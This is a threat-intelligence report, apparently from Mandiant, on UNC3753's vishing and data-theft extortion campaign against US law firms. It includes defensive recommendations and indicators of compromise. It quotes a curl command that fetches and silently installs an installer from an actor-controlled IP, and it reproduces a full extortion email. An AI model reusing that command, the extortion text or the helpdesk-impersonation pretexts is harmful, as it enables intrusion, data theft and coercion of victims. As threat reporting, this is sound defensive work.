---
source: rss/mandiant
title: Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms
url: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/
date: 2026-06-05
item_id: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/
category: news
tags: [Bypass]
---

**Source:** Mandiant
**Link:** https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/

Written by: Chad Reams, Tufail Ahmed, Keith Knapp, Ashley Frazer, Tyler McLellan 
  
   Introduction     
  From January through May 2026, Mandiant identified a financially motivated data theft extortion campaign executed by the threat cluster UNC3753 (also tracked as "Luna Moth," “Chatty Spider,” and "Silent Ransom Group") targeting dozens of organizations across professional, legal, and financial services in the United States.  
  UNC3753 leverages voice phishing (vishing) and social engineering deception techniques to achieve remote access into corporate environments. Using pretexts such as data migration or invoice related emails, the threat actors initiate phone conversations posing as IT support and convince targets to host screen-sharing sessions and download remote monitoring and management (RMM) utilities. Once inside the environment, the threat actors either directly conduct searches to locate and exfiltrate highly sensitive data, or manipulate the victim into executing these actions on their behalf. This data typically includes proprietary legal agreements, personally identifiable information (PII), and financial records for subsequent extortion demands.  
  Notably, in instances possibly linked to UNC3753, threat actors have accessed victims' systems in person.    In these physical incidents   , individuals posing as IT technicians entered corporate offices to attempt direct exfiltration of data from an endpoint using USB storage media.   
  This blog post details the threat group's technical lifecycle across recent Mandiant Consulting incident response engagements, highlights tactics like physical office targeting, and provides actionable recommendations to safeguard endpoints and infrastructure.  
  Threat Detail  
  The UNC3753 campaign lifecycle reflects an optimized, fast-tempo operational model. In many Mandiant investigated incidents, the entire attack sequence—from initial target contact to data theft and extortion—occurred within a single business day. Recently, Mandiant observed data searches, staging, and theft initiated in under an hour.   
  The threat group frequently initializes campaigns using benign, invoice-themed email lures sent from actor-controlled consumer email accounts. These messages contain no active links or malicious attachments. Instead, they typically contain a brief, generic message for example: “hello, here is the invcoie we talked about yesterday”. Google Threat Intelligence Group (GTIG) assesses that the primary purpose of these emails is to establish a pretext, raising the target's internal security concerns so they are more susceptible to follow-up voice calls.   
 






  
     
       
  

     

      
      
        
         
        
         
      
          Figure 1: UNC3753 attack lifecycle  
      
     

  
       
     
  




 
   Initial Access via IT Helpdesk Impersonation  
  The core of UNC3753's entry mechanism relies on targeted vishing. Mandiant has observed the group targeting personnel across all seniority levels, who are often publicly listed on the organization’s websites, to harvest phone numbers and email addresses. Acting as members of the organization's internal IT helpdesk or security team, threat actors place direct calls to these employees.   
  The callers use a variety of verbal instructions to guide target behavior. Under the guise of addressing a security issue or aiding with a corporate data migration project, they build trust and direct the target to join a screen-sharing session.  
  Remote Screen Control and Legitimate Tool Abuse  
  Once the target is engaged, the threat actors bypass conventional automated boundary security and email filtering controls by instructing the user to download and execute screen-sharing applications.   
  Screen-Sharing Utilities  
  UNC3753 instructs targets to initiate remote desktop and support sessions using built-in or commercial services, including Zoom, Microsoft Terminal Services, Microsoft Teams, and Quick Assist. During a Teams-facilitated intrusion, the threat actor held five distinct calls with the same target over a three-day period.  
  Commercial RMM Agents  
  UNC3753 frequently attempts to establish more persistent access by social engineering targets into downloading AnyDesk, Bomgar, or Zoho Assist installers. In one engagement, the threat actor attempted to install a "SuperOps RMM agent" by convincing the target to download and execute a payload via a cURL command.  
  Message Delivery via Privnote  
  Threat actors consistently utilize   privnote[.]com,   a web-based, self-destructing text utility, to transmit installation links and commands to targets. This evasion technique ensures that copy-paste vectors leave no permanent footprint on endpoint browsers or chat logs.  
  Example cURL command staging string observed in UNC3753 remote sessions:   
   curl -sL "http://[actor-controlled-ip]/installer" -o "SuperOps.msi" &amp;&amp; msiexec /i "SuperOps.msi" /quiet   
   Infrastructure Pivoting and Local Staging  
  Intrusions have abused Bring Your Own Device (BYOD) remote environments to access internal enterprise assets. In separate Mandiant Consulting cases, UNC3753 established Zoom sessions directly on targets' personal BYOD endpoints. Using these compromised personal laptops, they accessed corporate virtual desktop infrastructure (VDI) using native client platforms, such as Windows 365 (  Windows365.exe  ) or Citrix clients.   
  Once VDI environment access is secured, the threat actors pivot to corporate file systems:  
 
 
  System Enumeration: The threat actors map local directories, enumerate active OneDrive folders, and crawl mapped network drives.  
 
 
  Document Management Targeted Harvesting: Threat actors target specific legal and document storage repositories.  
 
 
  Keyword Search and File Staging: Threat actors use specific keyword search functions within iManage to locate highly sensitive folders containing tax logs (Forms W-2, W-9, and 1099), audit files, corporate client agreements, and Social Security numbers (SSNs). Staged results are compiled and sorted within target-accessible subdirectories, primarily inside the user's Downloads folder or native Roaming profile path.  
 
 
  Data Theft  
  UNC3753 exfiltrates the staged data using a variety of methods to bypass security controls. They frequently use portable versions of WinSCP or Rclone. In other instances, they simply log into a threat actor-controlled consumer file sharing account directly within the victim's web browser and batch upload the stolen files.  
 
 
  Cloud Storage Staging: Threat actors instruct targets—or directly control their screens—to drag and drop staged folders into threat actor-controlled consumer file sharing accounts. In several intrusions, the exfiltration destination included folders explicitly renamed to mimic the victim organization's branding.  
 
 
  FTP Utilities: When browser-based uploads are restricted by endpoint controls, threat actors download FTP and SFTP client binaries, primarily WinSCP, to exfiltrate bulk packages. In one incident, the threat group exfiltrated 1.7 gigabytes of data from a target's local OneDrive folder to a Google Drive account before pivoting to a VDI session and exfiltrating an additional 14.4 gigabytes using WinSCP. Google has taken action against this actor by disabling the Drive accounts and assets associated with this activity.  
 
 
  Email Forwarding: The threat actors have also had victims stage files from internal iManage repositories and instructed them to send the files to threat actor-controlled consumer email addresses from the target's mailbox.  
 
 
  Threat Actor Extortion Tactics  
  The threat cluster delivers unbranded extortion communications via email shortly after successfully stealing data, often within 30 minutes of exiting the target environment.   
  These highly aggressive extortion letters give organizations a three-day deadline to respond and initiate ransom negotiations. If the victim organization is unresponsive, the threat actors declare they will call and email target employees and external clients directly to alert them of the data breach. The extortion letters explicitly emphasize that the leak will compromise client trust, invite substantial regulatory fines, and suggest that external clients sue the victim organization for data mishandling. Additionally, as part of a follow-on message the group has threatened to publish all exfiltrated archives on the LEAKEDDATA data leak site (DLS).  
  Sample Extortion Email   
  
 
 
 
 
 
 
 
 
 
 
 
  
 
 
 
  Subject: [Victim Name] has lost confidential data of their clients. Very Important!  
  Hello,  
  We have to inform you that we got access to the [Victim Name] corporation's database and took a very large dataset. We have been in your network for weeks in multiple systems , aiming for proprietary and confidential files, and were able to obtain what We were looking for as well as the data of many clients. &lt;mentions the general nature of the stolen documents&gt;. This is not a joke or a scam.  
  This is a real problem that puts the existence of your firm in danger and to prove it We have attached screenshots that are confirming the possession of the files.  
  Reply to Our email and We will show you the complete file tree and actual files.  
  We are an elite group who's been in this business for a very long time, We have Our own website where We post the data and thousands of individuals follow Our work , and connections in different business social media. But, what's more important, is that We want to return your data peacefully and as soon as possible.  
  We will guarantee you the complete database deletion from Our servers, video evidence of us deleting the files, privacy of our communication and Our security advice with an explanation of how We got into your network and how to fix the vulnerability that We found.  
  In order for us to solve this problem you need to send us an email and start communicating with us. We hope to find a financial solution that will be acceptable for both parties.  
  In case of ignorance or no agreement, We will notify your employees, partners and customers, after which We will publish your data. You will receive claims from individuals, and legal entities for information leakage and breach of contracts, your current deals will be terminated. Journalists and others will dig into your documents, finding inconsistencies or violations in them. Your organization will lose its reputation, shares will fall in price, and your organization will be forced to close.  
  Let us remind you that your data can be used by many other hackers and criminals on the dark web as well as your competitors and enemies in case We leak the data.  
  Law enforcement will not help you, We are out of their jurisdiction, and We already took all the critical data. They will only tell you not to communicate with us and be the first ones to fine you.  
  As soon as you reach out, We will show you all the files that We obtained, so you can understand the seriousness of this problem and the necessity to proceed to the negotiations.  
  Our communication will stay 100% private before and after the agreement. We can show the proof of it as well.  
  All further communication can be done through this email address.  
  Do not waste any time as it is ticking . Text us today, so We don't have to start calling your employees tomorrow. You will have 3 days to start communicating.  
  Here We attached some screenshots confirming all the above. Respond to this email and We will send you the file tree.  
 
 
 
  
 
 
 
 
 
 
 
 
 
 
 
 
  Figure 2:  UNC3753 e  xtortion note example    
   Data Leak Site   
 






  
     
       
  

     

      
      
        
         
        
         
      
          Figure 3: LEAKEDDATA DLS (partially redacted; cropped)  
      
     

  
       
     
  




 
   Suspected UNC3753 Activity Involving Physical Access  
  While UNC3753 primarily relies on digital vectors, GTIG assesses that associated threat actors have also attempted direct data theft using physical, in person access. This escalating tactic is corroborated by a recent    FBI Cyber FLASH Alert    highlighting instances where Silent Ransom Group threat actors leveraged physical office access to exfiltrate corporate data via removable USB media.  
  According to the FBI advisory, if remote social engineering attempts fail, actors will send an individual to a victim's physical location. The onsite threat actor will claim they need to image the device or create local backups to address a security issue. Once they gain access to the endpoint, they attempt to exfiltrate corporate data directly to an external drive.  
  Although limited forensic evidence and the absence of a subsequent extortion attempt prevent formal attribution, GTIG assesses that these physical intrusions are likely associated with UNC3753 based on structural, timeline, and targeting overlaps.  
  Attribution  
  GTIG attributes this campaign and related social engineering operations to UNC3753 based on infrastructure overlaps, domain registrar tracking, victimology, and target staging directories.   UNC3753 (aliases: "Luna Moth," “Chatty Spider,” and "Silent Ransom Group (SRG)") is a financially motivated threat cluster active since at least March 2022. UNC3753 has TTP overlaps with UNC2686, a threat cluster that conducted "Bazarcall" style campaigns dating to early 2021. UNC3753 deployed LOCKBIT.BLACK in 2022, but has since prioritized data theft extortion-only operations typically involving threats to post stolen files to the LEAKEDDATA DLS. The threat cluster relies heavily on Remote Monitoring and Management (RMM) tools, unlike UNC2686 which deployed BAZARLOADER variants as well as TRICKBOT, URSNIF, and SILENTNIGHT. Initially, UNC3753 used subscription-themed billing email lures (such as fake software renewal alerts), typically with PDF attachments containing phone numbers for actor-controlled call centers. Beginning around March 2025, the cluster shifted tactics to pose as internal corporate IT helpdesk staff.  
  Remediation and Hardening  
  To mitigate the risk of voice phishing, physical office intrusions, and unauthorized endpoint control, GTIG recommends that organizations implement the following mitigation controls:  
  User Education  
  Conduct user awareness training specifically tailored to UNC3753 tactics, techniques, and procedures.  
  Physical Access and Verification Policies  
  Implement rigid out-of-band identity verification controls for all external contractors, technical staff, and facilities visitors. Mandate the following physical controls:  
 
 
  Require visitors to display official credentials and photo identification.  
 
 
  Require front-desk staff to copy and log all physical visitor IDs before granting access.  
 
 
  Verify the arrival of all technicians against pre-scheduled work orders directly with the verified parent organization or helpdesk dispatcher.  
 
 
  Enforce a policy requiring physical technical service personnel to be escorted by a corporate supervisor at all times.  
 
 
  Remote Access Conditional Access Controls  
  Implement remote access conditional access policies to ensure only corporate owned devices can authenticate to Virtual Desktop Instance (VDI) or Virtual Private Network (VPN) devices. This facilitates increased organizational control and visibility for potential Remote Monitoring and Management usage.   
  Enforce Strict RMM and Screen-Sharing Software Controls  
  Audit corporate environments to block the installation and execution of unauthorized remote monitoring, management, and support utilities. Enforce application control policies (e.g. Windows Defender Application Control or third-party endpoint protection tools) to restrict execution of non-approved binaries. Organizations may also consider restricting interactive screen-control features within authorized virtual meeting platforms like Zoom and Teams.   
  Endpoint Removable Media Hardening  
  To neutralize physical exfiltration vectors, disable read/write capabilities for all external USB mass storage devices. Enforce Group Policy Objects (GPOs) or MDM configurations to restrict:  
 
 
  USB storage device installation.  
 
 
  Removable media access.  
 
 
  Optical media writes on all corporate endpoints and BYOD systems utilizing VDI entry.  
 
 
  Network Monitoring and Egress Control  
  Monitor firewall logs, network flows, and endpoint execution logs for indicative exfiltration and staging actions. Specifically:  
 
 
  Block or alert on outbound connections to unauthorized file-sharing APIs and emails.  
 
 
  Ensure full session logging with bytes transferred is enabled within Firewall log configurations.  
 
 
  Monitor SSH traffic (Port 22) from internal VDIs and endpoints for high-volume WinSCP and Rclone transfers.  
 
 
  Application Log and Access Auditing  
  Review authentication and access metrics for critical document stores to identify bulk harvesting profiles.  
 
 
  Configure real-time alerts in iManage, SharePoint, and corporate email directories for rapid file searches, search-term spikes, and mass file downloads.  
 
 
  Implement multi-factor authentication (MFA) on business critical data repository applications, such as iManage.   
 
 
  Implement strict BYOD authentication controls, requiring MFA step-up queries when accessing VDI nodes.  
 
 
  Outlook and Implications  
  The targeting of US legal and professional services organizations by financially motivated actors is a persistent industry risk. Legal services firms represent high-value targets for extortion actors. They maintain concentrated repositories of extremely sensitive client transaction files, merger and acquisition plans, client trade secrets, and corporate regulatory reports. Threat groups recognize that legal entities are subject to heavy reputational and regulatory exposure and may be highly motivated to resolve extortion situations quietly to protect their professional standing.  
  Threat actors recognize that targeting the human element—specifically using voice-guided social engineering—enables them to easily bypass robust technical perimeters, web security gateways, and MFA configurations.   
  Finally, the integration of in-person, physical intrusions represents an escalation in threat capability. While log-based defenses and endpoint telemetry have matured, physical corporate boundaries are frequently protected only by administrative procedures. Organizations must transition to a unified security posture that treats physical facility access control and endpoint-based hardware policies as equal components of their defensive perimeter.  
  Data Leak Site (DLS)  
  UNC3753 utilizes the following web platform to disclose the identities of victims and their compromised data.  
 
 
  hxxps[:]//business-data-leaks[.]com  
 
 
  Phishing Domains  
  GTIG identified infrastructure registrations by suspected UNC3753 actors utilizing specific naming conventions, assessed as supporting their ongoing social engineering and vishing activities.  
 
 
  &lt;organization&gt;-itdesk[.]com  
 
 
  &lt;organization&gt;-it[.]com  
 
 
  &lt;organization&gt;-helpdesk[.]com  
 
 
  Indicators of Compromise (IOCs)   
  To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a  GTI Collection  for registered users.   
  
 
 
 
 
 
 
 
 
 
      
 
 
 
  IOC Type  
 
 
  Indicator  
 
 
 
 
  IPv4 Address  
 
 
  192.236.147.131  
 
 
 
 
  IPv4 Address  
 
 
  192.236.147.138  
 
 
 
 
  IPv4 Address  
 
 
  193.141.60.212  
 
 
 
 
  IPv4 Address  
 
 
  192.236.154.158  
 
 
 
 
  IPv4 Address  
 
 
  192.236.146.173  
 
 
 
 
  IPv4 Address  
 
 
  174.169.162.62  
 
 
 
 
  IPv4 Address  
 
 
  64.94.84.97  
 
 
 
  
 
 
 
 
 
 
 
 
 
  
   Google Security Operations (SecOps)  
  Google SecOps customers have access to these broad category rules and more under the Mandiant Intel Emerging Threats rule pack. The activity discussed in the blog post is detected in Google SecOps under the rule names:  
 
 
  Execute MSI Files Downloaded via Curl  
 
 
  Suspected Rclone Exfiltration  
 
 
  MITRE ATT&amp;CK   
  
 
 
 
 
 
 
 
 
 
       
 
 
 
  Tactic  
 
 
  Technique ID  
 
 
  Technique Name  
 
 
 
 
  Initial Access  
 
 
  T1566.004  
 
 
  Phishing: Spearphishing Voice  
 
 
 
 
  T1133  
 
 
  External Remote Services  
 
 
 
 
  Execution  
 
 
  T1204.002  
 
 
  User Execution: Malicious File  
 
 
 
 
  T1059.001  
 
 
  Command and Scripting Interpreter: PowerShell  
 
 
 
 
  T1059.003  
 
 
  Command and Scripting Interpreter: Windows Command Shell  
 
 
 
 
  T1569.002  
 
 
  System Services: Service Execution  
 
 
 
 
  Persistence  
 
 
  T1053.005  
 
 
  Scheduled Task/Job: Scheduled Task  
 
 
 
 
  T1547.001  
 
 
  Boot or Logon Autostart Execution: Registry Run Keys  
 
 
 
 
  Defense Evasion  
 
 
  T1036.005  
 
 
  Masquerading: Match Legitimate Name or Location  
 
 
 
 
  T1553.002  
 
 
  Subvert Trust Controls: Code Signing  
 
 
 
 
  T1562.001  
 
 
  Impair Defenses: Disable or Modify Tools  
 
 
 
 
  T1070.001  
 
 
  Indicator Removal: Clear Windows Event Logs  
 
 
 
 
  Credential Access  
 
 
  T1003.001  
 
 
  OS Credential Dumping: LSASS Memory  
 
 
 
 
  T1003.002  
 
 
  OS Credential Dumping: Security Account Manager  
 
 
 
 
  Discovery  
 
 
  T1083  
 
 
  File and Directory Discovery  
 
 
 
 
  T1135  
 
 
  Network Share Discovery  
 
 
 
 
  T1046  
 
 
  Network Service Discovery  
 
 
 
 
  Lateral Movement  
 
 
  T1219  
 
 
  Remote Access Software  
 
 
 
 
  T1021.001  
 
 
  Remote Services: Remote Desktop Protocol  
 
 
 
 
  T1021.004  
 
 
  Remote Services: SSH  
 
 
 
 
  Collection  
 
 
  T1005  
 
 
  Data from Local System  
 
 
 
 
  Command &amp; Control  
 
 
  T1572  
 
 
  Protocol Tunneling  
 
 
 
 
  Exfiltration  
 
 
  T1020  
 
 
  Automated Exfiltration  
 
 
 
 
  T1567.002  
 
 
  Exfiltration Over Web Service: Exfiltration to Cloud Storage  
 
 
 
 
  T1052.001  
 
 
  Exfiltration Over Physical Medium  
 
 
 
 
  Impact  
 
 
  T1486  
 
 
  Data Encrypted for Impact
